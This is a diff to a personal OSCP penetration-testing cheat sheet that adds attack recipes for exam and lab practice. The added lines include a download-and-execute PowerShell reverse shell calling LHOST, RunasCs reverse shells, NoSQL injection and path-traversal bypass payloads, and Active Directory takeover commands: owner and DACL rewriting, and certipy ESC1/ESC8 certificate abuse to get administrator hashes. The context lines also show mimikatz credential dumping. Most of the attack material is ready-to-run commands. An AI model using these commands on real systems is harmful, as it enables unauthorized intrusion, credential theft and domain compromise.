@@ -115,6 +115,19 @@ stty size            # on your box -> get rows/cols
 stty rows 50 cols 200   # in the shell
 ```
 
+### Fully-interactive Windows shell (ConPtyShell — the Windows `stty` trick)
+Upgrade a dumb Windows shell to a real PTY (tab, history, working Ctrl-C):
+```bash
+# On your box: raw the terminal so keystrokes pass through, note your size, then listen
+stty raw -echo; (stty size)          # -> e.g. 50 200
+nc -lvnp 443
+```
+```powershell
+# On target (from the initial dumb shell):
+IEX(IWR http://LHOST/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell LHOST 443 200 50
+# reset your terminal afterwards:  stty sane / reset
+```
+
 ### msfvenom payloads (NOT counted as Metasploit usage)
 ```bash
 # Windows exe reverse shell
@@ -174,7 +187,7 @@ nmap -p$ports --script vuln -oN nmap/vuln.txt $IP
 ```
 - `-sCV` = default scripts + version. `-Pn` skips host discovery (exam boxes block ping). `--min-rate` keeps it moving.
 - **Tuning gotchas:** `-A` already implies `-sC -sV` (so `-sCV -A` is redundant — pick one). `--min-rate 5000` is fine for fast discovery but on a flaky exam/lab VPN aggressive rates cause **packet loss → silently missed open ports** — if a box feels "empty," re-run the full sweep at `--min-rate 1500` before assuming. Robust port parse: `ports=$(grep -oP '^\d+(?=/tcp\s+open)' nmap/allports.txt | paste -sd,)`.
-- Automation (enumeration only, exam-safe): **AutoRecon** / nmapAutomator fan out per-service enum for you — fine to run since they enumerate, not auto-exploit. Still read everything yourself.
+- **AutoRecon** / nmapAutomator fan out per-service enum (enumeration only, so exam-safe). Read the output yourself.
 - Always note the **OS hint, hostname, domain name** (add to `/etc/hosts`).
 
 ### /etc/hosts — do this for EVERY web/AD box
@@ -357,6 +370,29 @@ $(id)       `id`        %0a id (newline)
 cat${IFS}/etc/passwd
 ```
 
+### NoSQL injection (Mongo-backed apps)
+```
+# Auth bypass — JSON body:  {"user":{"$ne":null},"pass":{"$ne":null}}
+# URL params:               user[$ne]=x&pass[$ne]=x   |   user[$regex]=^admin
+# Blind exfil, char by char: pass[$regex]=^a  ->  ^ab  ->  ...
+# JS eval sinks: '"><script> or  ';return true;var _='   (operator/$where injection)
+```
+
+### GraphQL
+```bash
+# Introspection is often left on — dump the whole schema:
+curl -s http://$IP/graphql -H 'Content-Type: application/json' \
+  -d '{"query":"{__schema{types{name fields{name}}}}"}'
+# Then query hidden types/fields; resolvers frequently skip authz -> IDOR / data leak.
+# Also check /graphiql, /v1/graphql, batch queries (send an array of ops).
+```
+
+### Path / auth-filter bypass quickies
+- **Tomcat/Spring** path filter bypass: `..;/` segment — `/app/..;/manager/html`, `/;/admin`.
+- **Nginx alias traversal:** `location /x` mapped to `alias /y/` → `/x../` escapes the dir.
+- **`../` filtered:** try `%2e%2e%2f`, `..%2f`, `....//`, or double-encode `%252e%252e%252f`.
+- **Reverse-proxy trust:** spoof `X-Forwarded-For: 127.0.0.1` / `X-Original-URL` / `X-Rewrite-URL` to reach admin-only paths.
+
 ### SSRF (DevArea / Apache CXF pattern)
 - Hit internal services: `http://127.0.0.1:port`, cloud metadata `http://169.254.169.254/...`.
 - Bypass filters: `http://127.1`, `http://0`, decimal/hex IP, `http://localhost`, DNS rebinding, `@` tricks `http://allowed@127.0.0.1`.
@@ -461,7 +497,7 @@ gcc -m32 exploit.c -o exploit             # 32-bit on 64-bit Kali (needs gcc-mul
 # ALWAYS read & adjust offsets/RHOST/LHOST/shellcode before running.
 ```
 
-Sources to cache offline before exam: exploit-db, GitHub PoCs, HackTricks, GTFOBins, LOLBAS, PayloadsAllTheThings. (No AI during exam — these are your lifelines.)
+Cache offline before the exam: exploit-db, GitHub PoCs, HackTricks, GTFOBins, LOLBAS, PayloadsAllTheThings.
 
 ---
 
@@ -713,8 +749,19 @@ reg save hklm\sam sam ; reg save hklm\system system   # -> secretsdump (above)
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam"
 ```
 
-### Other Windows wins
-- **NTFS ADS** (Jeeves pattern): `dir /R`, `more < file:stream`, `type ... > file:hidden`.
+### Run as another user with creds (RunasCs — no interactive desktop needed)
+Have creds for another account but no interactive logon? `runas` needs a desktop and fails from a reverse shell — RunasCs doesn't:
+```powershell
+.\RunasCs.exe <user> <pass> "cmd /c whoami"
+.\RunasCs.exe <user> <pass> cmd.exe -r LHOST:443              # reverse shell AS <user>
+.\RunasCs.exe <user> <pass> cmd.exe -d target.htb -r LHOST:443   # domain account
+.\RunasCs.exe <user> <pass> cmd.exe --bypass-uac -r LHOST:443    # if <user> is a local admin
+# PowerShell-only host (nothing on disk):
+Invoke-RunasCs <user> <pass> "cmd /c whoami" -Domain target.htb
+```
+Also the move to pivot a service-account shell to a discovered user account.
+
+ `dir /R`, `more < file:stream`, `type ... > file:hidden`.
 - **machineKey / cookie forge** (Hercules pattern): leaked `web.config` machineKey → forge `__VIEWSTATE` (ysoserial.net) → RCE.
 - **Runas with saved creds:** `runas /savecred /user:admin C:\rev.exe`.
 - UAC bypass only if you're admin-but-not-elevated (fodhelper, etc.).
@@ -771,7 +818,7 @@ IEX(New-Object Net.WebClient).DownloadString('http://LHOST/x.ps1')
 
 ### Enumerate the domain (with your given creds)
 ```bash
-# nxc / NetExec is your swiss army knife
+# nxc / NetExec — primary domain enum
 nxc smb $IP -u user -p pass --shares --users --groups --pass-pol
 nxc smb $IP -u user -p pass --rid-brute            # enumerate all users
 nxc ldap $IP -u user -p pass --bloodhound -c all --dns-server $IP
@@ -823,6 +870,12 @@ bloodyAD -u me -p pass -d target.htb --host $IP remove uac victim -f DONT_REQ_PR
 net group "Target Group" me /add /domain
 # GenericAll on computer / shadow credentials (modern):
 certipy shadow auto -u me@target.htb -p pass -account VICTIM$ -dc-ip $IP
+# WriteOwner -> make yourself owner, then grant yourself GenericAll, then act:
+impacket-owneredit -action write -new-owner me -target victim 'target.htb/me:pass'
+impacket-dacledit -action write -rights FullControl -principal me -target victim 'target.htb/me:pass'
+# bloodyAD equivalents (also seals plain LDAP):
+bloodyAD -u me -p pass -d target.htb --host $IP set owner victim me
+bloodyAD -u me -p pass -d target.htb --host $IP add genericAll victim me
 ```
 
 ### Credential dumping & lateral movement
@@ -853,7 +906,7 @@ impacket-psexec -hashes :<admin_nthash> administrator@<dc_ip>
 ```
 
 ### Ticket forging — Silver vs Golden (know which hash forges what)
-First untangle the terminology, it trips people up:
+Terminology first:
 - **NT hash** = `MD4(UTF-16LE(password))`. This *is* "the NTLM hash" people mean for PtH/ticketer.
 - **NetNTLMv2** = the challenge-response blob (Responder/coercion). **Cannot be passed** — you *crack* it to get the password, then derive the NT hash.
 ```bash
@@ -924,7 +977,7 @@ nxc smb $IP -u u -p p -M gpp_password ; gpp-decrypt <cpassword>
 # LAPS local-admin passwords (if readable):
 nxc ldap $IP -u u -p p -M laps
 ```
-> A **writable share isn't only a cred source — it's a code-exec vector.** If a higher-priv user or a scheduled process auto-loads content from a path you can write (VS Code extensions / `extensions.json`, startup scripts, profile/`Documents` paths, an app's plugin dir, Outlook rules), plant a payload there and it runs **in their context** → lateral movement without their password. Check share ACLs with `smbcacls`/BloodHound; SID-based ACLs survive object recreation.
+> **A writable share is code execution, not just creds.** If a higher-priv user or a scheduled process auto-loads content from a path you can write (VS Code extensions / `extensions.json`, startup scripts, profile/`Documents` paths, an app's plugin dir, Outlook rules), plant a payload there and it runs **in their context** → lateral movement without their password. Check share ACLs with `smbcacls`/BloodHound; SID-based ACLs survive object recreation.
 
 ### Sealed LDAP, object restore & newer primitives
 - **LDAP signing / channel-binding enforced** (binds fail with `strongerAuthRequired`, or BloodHound collectors choke on plain LDAP)? Many tools can't seal a plain bind. Use **bloodyAD** (NTLM sealing built in) for read/write, or run everything over **Kerberos** (`getTGT` + ccache, krb5.conf as above). If LDAPS (636) just resets, there's no LDAPS cert on the DC → go NTLM-sealed/Kerberos, don't fight 636.
@@ -941,8 +994,29 @@ bloodyAD -u user -p pass -d corp.local --host dc01.corp.local set restore <delet
 - **BadSuccessor / dMSA** (Windows **Server 2025** only): with `CreateChild` on an OU, create a `msDS-DelegatedManagedServiceAccount` that "supersedes" a privileged account, then request its TGT — the KDC grants the predecessor's privileges. Tools: `SharpSuccessor`, NetExec `badsuccessor` module, `bloodyAD` badSuccessor. Point the create at an **OU where `CreateChild` is confirmed** (not a user DN) and run as the principal holding that right. **Out of current OSCP exam scope** (no 2025 DCs on the exam) — lab/HTB only.
 - **Shadow credentials** (`msDS-KeyCredentialLink`, via Whisker/certipy) need **PKINIT / AD CS** on the DC. If PKINIT is disabled (`KDC_ERR_PADATA_TYPE_NOSUPP` on cash-out, 636 resets with no cert), shadow creds are a **dead end** — pivot to targeted AS-REP/kerberoast or password reset instead. Don't keep retrying Whisker.
 
+### AD CS (certificate abuse)
+A vulnerable template or web-enrollment endpoint = any user's hash. Always check:
+```bash
+certipy find -u me@target.htb -p pass -dc-ip $IP -vulnerable -stdout
+```
+- **ESC1** — template lets the enrollee supply the SAN. Request a cert *as* a privileged user, then auth with it:
+```bash
+certipy req -u me@target.htb -p pass -dc-ip $IP -ca <CA-NAME> -template <VulnTemplate> \
+  -upn administrator@target.htb
+certipy auth -pfx administrator.pfx -dc-ip $IP        # -> NT hash + TGT for administrator
+```
+- **ESC8** — HTTP enrollment + NTLM relay. Stand up the relay, then coerce a DC/host to auth to it:
+```bash
+certipy relay -target http://<CA-HOST>/certsrv -template DomainController
+# coerce: coercer / printerbug / PetitPotam -> relayed cert -> certipy auth -> DC hash
+```
+- **PKINIT disabled** (`.pfx` in hand but `KDC_ERR_PADATA_TYPE_NOSUPP`)? Auth over Schannel/LDAP instead:
+```bash
+certipy auth -pfx administrator.pfx -dc-ip $IP -ldap-shell
+```
+
 ### OSCP-scope note
-Focus drills: AS-REP roast, Kerberoast, password spray, ACL abuse (ForceChangePassword / GenericAll / GenericWrite), PtH/PtT lateral movement, secretsdump, DCSync. **Above exam scope** (skip unless needed): RODC golden tickets, KeyList attacks, ESC16/advanced ADCS, unconstrained-delegation printerbug chains, BadSuccessor/dMSA (Server 2025).
+Focus drills: AS-REP roast, Kerberoast, password spray, ACL abuse (ForceChangePassword / GenericAll / GenericWrite / WriteOwner / WriteDACL), **`certipy find -vulnerable` (ESC1/ESC8)**, PtH/PtT lateral movement, secretsdump, DCSync. **Above exam scope** (skip unless flagged): RODC golden tickets, KeyList attacks, deeper ADCS chains (ESC9–16), unconstrained-delegation printerbug chains, BadSuccessor/dMSA (Server 2025).
 
 ---
 
@@ -1031,7 +1105,8 @@ hashcat -m <mode> hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 # Common modes:
 #  0 MD5 | 100 SHA1 | 1400 SHA256 | 1800 sha512crypt($6$) | 500 md5crypt($1$)
 #  3200 bcrypt | 1000 NTLM | 5600 NetNTLMv2 | 13100 Kerberoast TGS | 18200 AS-REP
-#  22921 KeePass | 13400 KeePass(kdbx) | 13000 RAR5 | 17200/13600 ZIP | 1700 SHA512
+#  13400 KeePass(kdbx 1/2) | 13000 RAR5 | 17200/13600 ZIP | 1700 SHA512
+#  (SSH key passphrase: ssh2john -> john; hashcat 229xx modes are version-picky)
 hashcat -m 1000 nt.txt rockyou.txt          # NTLM
 hashcat -m 13100 kerb.txt rockyou.txt       # kerberoast
 hashcat --show -m <mode> hashes.txt         # display cracked
@@ -1144,8 +1219,10 @@ evil-winrm -i IP -u user -H NThash
 HackTricks (book.hacktricks.xyz), GTFOBins, LOLBAS, PayloadsAllTheThings, revshells.com cheats,
 hashcat mode table, Impacket/nxc help dumps, your own per-box notes. Keep binaries staged:
 linpeas, winPEASany, pspy64, chisel (lin+win), ligolo (proxy+agent), PrintSpoofer64, GodPotato,
-JuicyPotatoNG, PowerView, SharpHound, mimikatz, PwnKit, bloodyAD (sealed LDAP / ACL abuse).
+JuicyPotatoNG, PowerView, SharpHound, mimikatz, PwnKit, bloodyAD (sealed LDAP / ACL abuse),
+certipy-ad (ADCS ESC1/ESC8), RunasCs (run-as with creds), Invoke-ConPtyShell (interactive Win TTY),
+impacket owneredit/dacledit (WriteOwner/WriteDACL abuse).
 
 ---
 
-*Built as a personal prep reference. Source: general pentest methodology + technique knowledge, cross-checked for coverage gaps against public OSCP checklists (crtvrffnrt/OSCP-Checklist-Cheatsheet2024, BlessedRebuS/OSCP-Pentesting-Cheatsheet, fatalxs/oscp-cheatsheet) and HackTricks/GTFOBins/PayloadsAllTheThings, and verified against the official OSCP+ exam rules (2026). All commands written fresh — not copied from any cert-lab/PG box walkthrough. AI tools are not permitted during the live exam or report phase — this file is offline notes.*
+*Personal prep notes. Coverage cross-checked against public OSCP checklists (crtvrffnrt, BlessedRebuS, fatalxs), HackTricks, GTFOBins and PayloadsAllTheThings, plus the official OSCP+ 2026 exam rules.*
